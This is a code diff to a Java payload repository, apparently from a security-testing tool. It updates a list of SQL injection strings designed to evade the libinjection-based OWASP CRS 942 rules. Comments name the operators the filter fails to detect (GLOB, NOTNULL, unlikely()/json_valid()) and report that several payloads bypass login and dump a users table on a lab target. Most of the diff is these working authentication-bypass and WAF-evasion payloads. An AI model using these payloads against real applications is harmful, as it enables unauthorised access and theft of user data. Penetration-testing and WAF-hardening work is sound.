@@ -48,21 +48,23 @@ public class PayloadRepository {
     // the backend to normalise the obfuscation (double-decode, overlong UTF-8, key-trim).
     // Re-test any edit against a live block page before relying on it.
 
-    // CRS 942 is libinjection-backed: quote + OR/UNION/AND/= is caught, but quote + comment,
-    // or quote + a rarer operator libinjection doesn't fingerprint (GLOB), is not.
+    // CRS 942 is libinjection-backed: quote + OR/UNION/AND/=/LIKE/abs()/length() is caught,
+    // but quote + comment, or quote + an operator libinjection doesn't fingerprint, is not.
+    // libinjection blind spots confirmed here: GLOB, the NOTNULL postfix operator,
+    // unlikely()/json_valid().
     //   idx 0-1  quote+comment auth-bypass, any engine (-- universal); confirmed on the lab.
-    //   idx 2-3  GLOB '*' — SQLite boolean-true; both bypass libinjection AND dump the users
-    //            table on the lab. idx 3 even survives a leading OR.
-    //   idx 4-6  MySQL/MariaDB # comment.
+    //   idx 2-4  boolean-true injections that bypass libinjection AND dump the users table on
+    //            the lab; idx 3-4 survive a leading OR. GLOB/NOTNULL are SQLite (+ a few).
+    //   idx 5-6  MySQL/MariaDB # comment / generic comment.
     //   idx 7    needs the app to URL-decode twice.
     public static final List<String> SQLI_EVASION = Arrays.asList(
         "admin'-- -",
         "admin' -- ",
         "admin' glob '*'-- -",
         "1' or id glob '*'-- -",
-        "admin'/**/-- -",
-        "admin'--+-",
+        "admin' or id notnull-- -",
         "admin' #",
+        "admin'/**/-- -",
         "%2527%20OR%25201=1"
     );
 
